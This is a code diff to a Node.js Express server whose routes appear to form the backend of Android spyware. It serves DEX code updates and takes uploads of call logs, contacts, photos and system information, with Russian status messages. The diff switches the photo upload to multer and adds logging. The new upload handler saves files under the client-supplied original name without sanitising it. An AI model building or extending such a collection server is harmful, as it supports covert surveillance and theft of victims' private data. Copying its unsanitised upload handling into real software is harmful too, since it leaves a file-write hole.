@@ -1,5 +1,4 @@
-const { Console } = require('console');
-const express = require('express');
+const express = require('express'); const multer = require("multer");
 const fs = require('fs');
 const path = require('path');
 
@@ -21,7 +20,7 @@ app.get('/get-latest-dex', (req, res) => {
 });
 
 app.post('/upload-calls', (req, res) => {
-  console.log("/upload-calls")
+  console.log("/upload-calls:")
   const callLog = req.body;
   if (!callLog || !Array.isArray(callLog)) return res.status(400).send('Неверный формат данных')
   const logFile = './call_logs.json';
@@ -51,25 +50,38 @@ app.post('/upload-contacts', (req, res) => {
   });
 });
 
-app.post('/upload-photos', (req, res) => {
-  const photosData = req.body;
-
-  const metaPath = path.join(__dirname, 'uploads', 'photos_meta.json');
-  fs.appendFileSync(metaPath, JSON.stringify(photosData) + '\n');
-
-  photosData.forEach((photo, index) => {
-    if (photo.base64) {
-      const buffer = Buffer.from(photo.base64, 'base64');
-      const filename = `photo_${Date.now()}_${index}.jpg`;
-      fs.writeFileSync(path.join(__dirname, 'uploads', filename), buffer);
+const storage = multer.diskStorage({
+  destination: (req, file, cb) => {
+    const uploadPath = path.join(__dirname, "uploads");
+    if (!fs.existsSync(uploadPath)) {
+      fs.mkdirSync(uploadPath, { recursive: true });
     }
-  });
+    cb(null, uploadPath);
+  },
+  filename: (req, file, cb) => {
+    cb(null, Date.now() + "-" + file.originalname);
+  }
+});
 
-  res.status(200).send('Photos received');
+const upload = multer({ storage });
+
+app.post("/upload-photos", upload.array("photos", 5), (req, res) => {
+  if (!req.files || req.files.length === 0) {
+    return res.status(400).json({ message: "Файлы не загружены" });
+  }
+
+  res.json({
+    message: "Фотографии успешно загружены",
+    files: req.files.map(file => ({
+      filename: file.filename,
+      path: file.path
+    }))
+  });
 });
 
 app.post('/upload-system-info', (req, res) => {
   const systemInfo = req.body;
+  console.log("/upload-system-info", Date.now().toLocaleString())
 
   const logEntry = {
     timestamp: new Date().toISOString(),
